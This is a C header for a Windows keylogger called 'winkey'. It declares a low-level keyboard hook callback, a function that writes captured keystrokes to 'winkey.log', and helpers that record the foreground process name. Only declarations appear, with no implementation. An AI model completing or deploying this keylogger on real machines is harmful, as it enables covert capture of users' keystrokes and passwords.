#ifndef WINKEY_H
#define WINKEY_H

#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#include <psapi.h>
#include <time.h>
#include <wchar.h>
#include <string.h>

#define WINKEY "winkey.log"

void                AffProcessName(DWORD processID, const char *path);

int                 forground_process(void);
int                 write_key(const char *path, KBDLLHOOKSTRUCT *kb);
int                 create_file(const char *path);

LRESULT CALLBACK    foo(int ncode, WPARAM wparam, LPARAM lparam);

#endif